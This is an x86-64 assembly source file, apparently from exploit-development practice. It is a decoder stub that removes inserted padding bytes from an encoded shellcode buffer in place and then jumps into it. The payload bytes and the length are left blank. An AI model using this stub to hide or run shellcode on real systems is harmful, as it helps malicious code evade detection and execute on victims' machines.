; Author : Abhinav Thakur
; Email  : compilepeace@gmail.com
;
; Description : This decoder removes the extra Bytes padding added into the shellcode and then
; 				executes it.
;
; NOTE : Just add the shellcode (comma separated values) after the label 'shellcode' and 
;		 Half of length of encoded shellcode in RCX (line 33).
;
; SHELLCODE LENGTH = 



global _start


section .text
_start:
	
	jmp Main
	encoded_shellcode:	db	


Main:

	lea rsi, [rel encoded_shellcode]
	xor rdi, rdi
	mov	rcx, rdi
	add rdi, 0x1			; Points to actual shellcode bytes
	xor rax, rax			
	add rax, 0x2			; Points to inserted bytes (0xAA's)
	
	mov	rcx, 				; Half of Length of encoded shellcode 
	
		
decode:
	
	mov	bl, byte [rsi + rax]
	mov	byte [rsi + rdi], bl 
	inc rdi
	add rax, 0x2
	loop decode

	jmp	rsi


